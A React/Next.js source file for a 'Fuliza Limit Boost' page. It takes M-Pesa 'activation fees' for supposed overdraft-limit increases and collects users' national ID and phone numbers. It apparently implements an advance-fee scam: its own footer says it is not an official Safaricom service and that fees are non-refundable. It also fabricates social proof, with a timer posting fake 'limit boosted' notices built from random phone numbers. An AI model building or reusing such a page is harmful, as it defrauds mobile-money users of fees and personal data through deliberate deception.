"use client";

import { useState, useEffect, useCallback } from "react";
import Modal from "react-modal";
import { toast, Toaster } from "react-hot-toast";
import { initiateFulizaPayment } from "@/app/actions/fuliza-payment";

if (typeof window !== "undefined") {
  Modal.setAppElement("body");
}

const signatureGreen = "#19AC56";
const signatureDark = "#168A2E";
const limitBgColor = "#EBFAF1";

const limitOptions = [
  { amount: "5,000", fee: "59", hot: false },
  { amount: "7,500", fee: "99", hot: false },
  { amount: "10,000", fee: "149", hot: false },
  { amount: "12,500", fee: "210", hot: false },
  { amount: "16,000", fee: "450", hot: false },
  { amount: "21,000", fee: "550", hot: false },
  { amount: "25,500", fee: "649", hot: true },
  { amount: "30,000", fee: "700", hot: true },
  { amount: "35,000", fee: "850", hot: false },
  { amount: "40,000", fee: "1,000", hot: false },
  { amount: "45,000", fee: "1,250", hot: false },
  { amount: "50,000", fee: "1,500", hot: false },
  { amount: "60,000", fee: "1,750", hot: false },
  { amount: "70,000", fee: "2,050", hot: false },
];

const phonePrefixes = ["070", "071", "072", "074", "079", "011"];

export default function Home() {
  const [selectedLimit, setSelectedLimit] = useState("10,000");
  const [modalIsOpen, setModalIsOpen] = useState(false);
  const [idNumber, setIdNumber] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);

  // Live transaction notifications
  useEffect(() => {
    const interval = setInterval(() => {
      const prefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
      const lastDigits = Math.floor(1000 + Math.random() * 9000);
      const randomLimit = limitOptions[Math.floor(Math.random() * limitOptions.length)].amount;

      toast.success(`${prefix}****${lastDigits} · Limit boosted to Ksh ${randomLimit}`, {
        duration: 4000,
        style: {
          background: signatureGreen,
          color: "#fff",
          fontSize: "13px",
          fontWeight: "500",
          borderRadius: "12px",
        },
        iconTheme: { primary: signatureGreen, secondary: "#fff" },
      });
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  const getSelectedFee = useCallback(() => {
    return limitOptions.find((opt) => opt.amount === selectedLimit)?.fee || "0";
  }, [selectedLimit]);

  const handlePayNow = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!phoneNumber.trim() || !idNumber.trim()) {
      return toast.error("ID number and phone number are required");
    }

    const phoneRegex = /^(0|254|7)[0-9]{8,9}$/;
    if (!phoneRegex.test(phoneNumber.trim().replace(/\s+/g, ''))) {
      return toast.error("Please enter a valid Kenyan phone number");
    }

    if (!/^\d{8}$/.test(idNumber.trim().replace(/\s+/g, ''))) {
      return toast.error("Please enter a valid 8-digit ID number");
    }

    setIsProcessing(true);
    const loadingToast = toast.loading("Requesting M-Pesa STK push...");

    try {
      const result = await initiateFulizaPayment(
        phoneNumber,
        getSelectedFee(),
        idNumber,
        selectedLimit
      );

      toast.dismiss(loadingToast);

      if (result.success) {
        toast.success(result.message || "✅ Check your phone for M-Pesa PIN prompt", {
          duration: 6000,
          icon: "📱"
        });
        
        setTimeout(() => {
          setIdNumber("");
          setPhoneNumber("");
          setModalIsOpen(false);
        }, 3000);
      } else {
        toast.error(result.message || "Payment failed. Please try again.", {
          duration: 5000
        });
        console.error("Payment failed:", result.details);
      }
    } catch (error) {
      toast.dismiss(loadingToast);
      toast.error("Network error. Please check your connection and try again.");
      console.error("Payment error:", error);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-white font-sans text-gray-900 flex flex-col antialiased">
      <Toaster position="top-right" />

      {/* ===== 🟢 HEADER WITH LIGHT GREEN BACKGROUND ===== */}
      <header className="pt-20 pb-10 px-4 sm:px-6 text-center" style={{ backgroundColor: limitBgColor }}>
        <div className="max-w-3xl mx-auto">
          <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold tracking-tight mb-4 text-gray-900">
            Boost your <span style={{ color: signatureGreen }}>Fuliza Limit</span>
          </h1>
          <p className="text-base sm:text-lg text-gray-600 max-w-xl mx-auto leading-relaxed px-2">
            Choose your target limit and complete a secure payment to upgrade instantly.
          </p>
        </div>
      </header>

      {/* Limits - 2 COLUMNS ON MOBILE, 3 ON DESKTOP */}
      <main className="flex-grow max-w-6xl mx-auto px-4 sm:px-6 pb-28 w-full mt-10">
        <div className="grid grid-cols-2 sm:grid-cols-2 lg:grid-cols-3 gap-3 sm:gap-5">
          {limitOptions.map((opt) => {
            const isSelected = selectedLimit === opt.amount;
            return (
              <button
                key={opt.amount}
                onClick={() => setSelectedLimit(opt.amount)}
                className={`
                  group relative flex flex-col p-4 sm:p-6 rounded-xl border-2 transition-all text-left
                  ${isSelected
                    ? "border-[signatureGreen] bg-[signatureGreen]/5 shadow-md"
                    : "border-gray-100 bg-white hover:border-gray-200 hover:bg-gray-50/30"
                  }
                `}
                style={{
                  borderColor: isSelected ? signatureGreen : undefined,
                  backgroundColor: isSelected ? `${signatureGreen}0D` : undefined,
                }}
              >
                {opt.hot && (
                  <span className="absolute -top-3 right-2 sm:right-4 bg-amber-500 text-white text-[8px] sm:text-[10px] font-semibold px-2 sm:px-2.5 py-1 rounded-full uppercase tracking-wider">
                    Most popular
                  </span>
                )}
                <div>
                  <p className="text-[10px] sm:text-xs font-medium text-gray-500 uppercase tracking-wide mb-1.5">
                    New limit
                  </p>
                  <p
                    className="text-xl sm:text-2xl font-bold"
                    style={{ color: isSelected ? signatureGreen : undefined }}
                  >
                    Ksh {opt.amount}
                  </p>
                </div>
                <div className="mt-2 sm:mt-3 flex items-baseline">
                  <span className="text-xs sm:text-sm font-medium text-gray-500">Fee</span>
                  <span className="ml-1 sm:ml-2 text-base sm:text-lg font-semibold text-gray-900">
                    Ksh {opt.fee}
                  </span>
                </div>
              </button>
            );
          })}
        </div>
      </main>

      {/* Continue to payment - ALWAYS SHOW FEE on mobile & desktop */}
      <div className="fixed bottom-0 left-0 right-0 bg-white/80 backdrop-blur-md border-t border-gray-100 z-40 py-4 px-4 sm:px-6">
        <div className="max-w-6xl mx-auto flex items-center justify-between gap-4">
          <div className="block sm:block">
            <p className="text-xs font-medium text-gray-500 mb-0.5">Activation fee</p>
            <p className="text-xl sm:text-2xl font-bold text-gray-900 leading-tight">
              Ksh {getSelectedFee()}
            </p>
          </div>
          <button
            onClick={() => setModalIsOpen(true)}
            className="flex-1 sm:flex-none text-white px-6 sm:px-8 py-3 sm:py-3.5 rounded-xl font-semibold text-sm sm:text-base shadow-lg transition-all active:scale-[0.98]"
            style={{ backgroundColor: signatureGreen }}
            onMouseOver={(e) => (e.currentTarget.style.backgroundColor = signatureDark)}
            onMouseOut={(e) => (e.currentTarget.style.backgroundColor = signatureGreen)}
          >
            Continue to payment
          </button>
        </div>
      </div>

      {/* Footer - ONE COLUMN on mobile, GRID on desktop - FIXED! */}
      <footer className="bg-gray-50 border-t border-gray-100 pt-10 sm:pt-12 pb-8 px-4 sm:px-6 text-gray-700 text-sm mt-10">
        <div className="max-w-6xl mx-auto space-y-8">
          {/* ✅ FIXED: One column on mobile, grid on desktop */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-6 sm:gap-6">
            {/* Instant Access */}
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M13 10V3L4 14H11V21L20 10H13Z" fill={signatureGreen} stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
              <div>
                <h4 className="font-semibold text-gray-900 text-base mb-1">Instant Access</h4>
                <p className="text-sm text-gray-600 leading-relaxed">Limit increased after payment confirmation.</p>
              </div>
            </div>

            {/* Secure Payment */}
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M2 17L12 22L22 17" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M2 12L12 17L22 12" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
              <div>
                <h4 className="font-semibold text-gray-900 text-base mb-1">Secure Payment</h4>
                <p className="text-sm text-gray-600 leading-relaxed">Protected by M‑Pesa secure infrastructure.</p>
              </div>
            </div>

            {/* No Paperwork */}
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M14 2H6C5.46957 2 4.96086 2.21071 4.58579 2.58579C4.21071 2.96086 4 3.46957 4 4V20C4 20.5304 4.21071 21.0391 4.58579 21.4142C4.96086 21.7893 5.46957 22 6 22H18C18.5304 22 19.0391 21.7893 19.4142 21.4142C19.7893 21.0391 20 20.5304 20 20V8L14 2Z" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M14 2V8H20" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M16 13H8" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M16 17H8" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M10 9H9H8" stroke={signatureGreen} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
              </div>
              <div>
                <h4 className="font-semibold text-gray-900 text-base mb-1">No Paperwork</h4>
                <p className="text-sm text-gray-600 leading-relaxed">Complete everything digitally in minutes.</p>
              </div>
            </div>  
          </div>

          <div className="border-t border-gray-200 pt-6 text-center text-gray-500 text-xs space-y-1">
            <p>© 2026 Fuliza Limit Boost Service. This is not an official Safaricom service.</p>
            <p>Service fees are non‑refundable. Ensure your M‑Pesa account has sufficient funds.</p>
          </div>
        </div>
      </footer>

      {/* Modal - TIGHTER PADDING on mobile */}
      <Modal
        isOpen={modalIsOpen}
        onRequestClose={() => !isProcessing && setModalIsOpen(false)}
        className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[92%] sm:w-[90%] max-w-md outline-none"
        overlayClassName="fixed inset-0 bg-black/60 backdrop-blur-sm z-50"
      >
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden">
          <div className="px-5 sm:px-8 pt-6 sm:pt-8 pb-5 sm:pb-6 text-center" style={{ backgroundColor: signatureGreen }}>
            <h2 className="text-xl sm:text-2xl font-bold text-white mb-2">Complete Your Request</h2>
            <p className="text-xs sm:text-sm text-white/90 leading-relaxed">Enter your details to boost your Fuliza limit</p>
          </div>

          <div className="px-5 sm:px-8 py-4 flex justify-between items-center" style={{ backgroundColor: limitBgColor }}>
            <div className="text-center flex-1">
              <p className="text-xs text-gray-600 mb-1">New limit</p>
              <p className="text-base sm:text-lg font-bold text-gray-900">Ksh {selectedLimit}</p>
            </div>
            <div className="w-px h-8 bg-gray-300"></div>
            <div className="text-center flex-1">
              <p className="text-xs text-gray-600 mb-1">Processing fee</p>
              <p className="text-base sm:text-lg font-bold text-gray-900">Ksh {getSelectedFee()}</p>
            </div>
          </div>

          <form onSubmit={handlePayNow} className="px-5 sm:px-8 pt-5 sm:pt-6 pb-6 sm:pb-8 space-y-5">
            {/* ID Number - Premium Icon */}
            <div className="space-y-1.5">
              <label className="block text-sm font-medium text-gray-700">ID Number</label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20 21V19C20 17.9391 19.5786 16.9217 18.8284 16.1716C18.0783 15.4214 17.0609 15 16 15H8C6.93913 15 5.92172 15.4214 5.17157 16.1716C4.42143 16.9217 4 17.9391 4 19V21" stroke={signatureGreen} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
                    <path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke={signatureGreen} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <input
                  id="idNumber"
                  type="text"
                  placeholder="e.g. 12345678"
                  className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-xl text-gray-900 text-base focus:border-[#19AC56] focus:ring-0 outline-none transition-colors"
                  value={idNumber}
                  onChange={(e) => setIdNumber(e.target.value)}
                  required
                  disabled={isProcessing}
                />
              </div>
            </div>

            {/* Phone Number - Premium Icon */}
            <div className="space-y-1.5">
              <label className="block text-sm font-medium text-gray-700">M-Pesa Phone Number</label>
              <div className="relative">
                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M22 16.92V19.92C22.0005 20.1985 21.943 20.474 21.8321 20.7294C21.7213 20.9848 21.5598 21.2141 21.3579 21.4024C21.156 21.5906 20.9182 21.7339 20.6583 21.8247C20.3984 21.9156 20.1225 21.9521 19.847 21.932C17.8797 21.7572 15.9564 21.2791 14.145 20.516C12.4342 19.796 10.8672 18.7828 9.52002 17.528C8.27198 16.1878 7.2614 14.6301 6.54002 12.928C5.77086 11.1075 5.2894 9.17329 5.11002 7.19599C5.08988 6.92048 5.12636 6.64455 5.21722 6.38467C5.30809 6.12479 5.45137 5.88699 5.63962 5.68506C5.82786 5.48312 6.05712 5.32168 6.31253 5.21082C6.56794 5.09997 6.84347 5.04248 7.12202 5.04299H10.122C10.5952 5.03815 11.0509 5.21867 11.3928 5.5437C11.7346 5.86873 11.9336 6.30976 11.942 6.77499C12.0166 7.58791 12.185 8.39002 12.443 9.16499C12.5363 9.44991 12.5529 9.75286 12.4916 10.0451C12.4303 10.3373 12.2929 10.6087 12.092 10.831L10.752 12.171C11.8986 14.1111 13.5942 15.7002 15.642 16.714L16.982 15.374C17.2043 15.1731 17.4757 15.0357 17.7679 14.9744C18.0602 14.9131 18.3631 14.9297 18.648 15.023C19.4229 15.2804 20.2251 15.4488 21.038 15.524C21.5092 15.5328 21.9552 15.7365 22.2796 16.0842C22.604 16.4319 22.7788 16.8922 22.77 17.3659L22 16.92Z" stroke={signatureGreen} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <input
                  id="phoneNumber"
                  type="tel"
                  placeholder="0712 345 678"
                  className="w-full pl-10 pr-4 py-3 border-2 border-gray-200 rounded-xl text-gray-900 text-base focus:border-[#19AC56] focus:ring-0 outline-none transition-colors"
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  required
                  disabled={isProcessing}
                />
              </div>
            </div>

            <p className="text-center text-xs text-gray-500 pt-1">You will receive an M‑Pesa STK push on this number</p>

            <div className="grid grid-cols-2 gap-3 pt-4">
              <button 
                type="button" 
                onClick={() => setModalIsOpen(false)} 
                disabled={isProcessing} 
                className="px-4 py-3 rounded-xl border-2 border-gray-200 bg-white text-gray-700 text-sm font-medium hover:bg-gray-50 transition-colors disabled:opacity-50"
              >
                Cancel
              </button>
              <button 
                type="submit" 
                disabled={isProcessing} 
                className="px-4 py-3 rounded-xl text-white text-sm font-semibold shadow-lg hover:shadow-xl transition-all disabled:opacity-50"
                style={{ backgroundColor: signatureGreen }}
              >
                {isProcessing ? (
                  <span className="flex items-center justify-center gap-2">
                    <svg className="animate-spin h-4 w-4 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                  </span>
                ) : "Pay now"}
              </button>
            </div>

            <div className="flex items-center justify-center gap-2 pt-2">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="#9CA3AF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M2 17L12 22L22 17" stroke="#9CA3AF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                <path d="M2 12L12 17L22 12" stroke="#9CA3AF" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
              </svg>
              <p className="text-center text-xs text-gray-500 font-medium">Secure payment powered by M‑Pesa</p>
            </div>
          </form>
        </div>
      </Modal>
    </div>
  );
}